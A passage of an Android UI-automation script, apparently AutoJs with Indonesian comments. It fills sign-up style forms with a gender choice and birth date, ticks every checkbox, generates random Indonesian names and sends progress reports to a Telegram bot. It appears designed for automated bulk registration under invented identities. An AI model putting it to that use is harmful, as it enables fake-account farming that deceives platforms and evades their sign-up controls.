                         textContains("Jenis kelamin").findOne(1200);

    if (genderSelector) {
        if (genderSelector.clickable()) {
            genderSelector.click();
        } else if (genderSelector.parent() && genderSelector.parent().clickable()) {
            genderSelector.parent().click();
        } else {
            click(genderSelector.bounds().centerX(), genderSelector.bounds().centerY());
        }
        sleep(1000);
    } else {
        // Fallback: cari Spinner kedua di halaman jika teks tidak terdeteksi
        var spinners = className("android.widget.Spinner").find();
        if (spinners.length >= 2) {
            spinners[1].click();
            sleep(1000);
        } else if (spinners.length == 1) {
            spinners[0].click();
            sleep(1000);
        }
    }

    // Klik opsi gender (Wanita / Pria / Rather not say)
    var genderClicked = clickTextOrDescMatch(["Wanita", "Pria", "Female", "Male", "Rather not say", "Tidak ingin memberi tahu"]);
    if (!genderClicked) {
        // Jika opsi berupa list item (ListView / dialog), klik item pertama atau kedua
        var listItems = className("android.widget.CheckedTextView").find();
        if (listItems.length > 1) {
            listItems[1].click();
            genderClicked = true;
        }
    }
    sleep(800);
    return genderClicked;
}

// Isi Tanggal Lahir (Hari, Bulan, Tahun)
function isiTanggalLahir(day, year) {
    // 1. Bulan (Month dropdown)
    var monthSelector = textContains("Month").findOne(1000) || textContains("Bulan").findOne(1000) || className("android.widget.Spinner").findOnce(0);
    if (monthSelector) {
        if (monthSelector.clickable()) {
            monthSelector.click();
        } else if (monthSelector.parent() && monthSelector.parent().clickable()) {
            monthSelector.parent().click();
        } else {
            click(monthSelector.bounds().centerX(), monthSelector.bounds().centerY());
        }
        sleep(1000);
        clickTextOrDescMatch(["August", "Agustus", "July", "Juli", "March", "Maret", "January", "Januari"]);
        sleep(800);
    }

    // 2. Hari (Day input)
    var dayInput = text("Day").findOne(1000) || text("Hari").findOne(1000) || className("android.widget.EditText").findOnce(0);
    if (dayInput) {
        dayInput.click();
        sleep(400);
        dayInput.setText(day);
        sleep(600);
    }

    // 3. Tahun (Year input)
    var yearInput = text("Year").findOne(1000) || text("Tahun").findOne(1000) || className("android.widget.EditText").findOnce(1);
    if (yearInput) {
        yearInput.click();
        sleep(400);
        yearInput.setText(year);
        sleep(600);
    }

    // 4. Gender (Panggil fungsi khusus yang akurat & tahan banting)
    pilihGender();
}

// Centang semua Checkbox di layar
function centangSemuaCheckbox() {
    var boxes = className("android.widget.CheckBox").find();
    for (var i = 0; i < boxes.length; i++) {
        try {
            if (!boxes[i].isChecked()) {
                boxes[i].click();
                sleep(400);
            }
        } catch (e) {}
    }
}

// Scroll ke bawah
function scrollDownIfNeeded() {
    scrollDown();
    sleep(800);
}

// Random Number Generator
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Random Nama Indonesia / Internasional yang natural
function getRandomName() {
    var names = [
        "nadia", "arib", "bintang", "dian", "fajar", "gilang", "haikal", 
        "ihsan", "jamal", "kurnia", "lutfi", "maulana", "nugraha", "okta", 
        "pratama", "rizki", "satria", "taufiq", "utomo", "wahyu", "yusuf", 
        "aditya", "bagas", "cahyo", "dimas", "erik", "fahmi", "gunawan",
        "ines", "seika", "kaila", "hubner", "zahra", "tiara", "anisa"
    ];
    return names[Math.floor(Math.random() * names.length)];
}

// Kirim Pesan ke Bot Telegram
function sendTelegramMessage(botToken, chatId, messageText) {
    threads.start(function() {
        try {
            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            var res = http.post(url, {
                chat_id: chatId,
                text: messageText,
                parse_mode: "Markdown"
            });
            if (res.statusCode == 200) {
                toastLog("Laporan terkirim ke Telegram!");
            } else {
                toastLog("Gagal kirim Telegram: " + res.body.string());
            }
        } catch (err) {
            toastLog("Error Telegram: " + err.message);
        }
    });
}
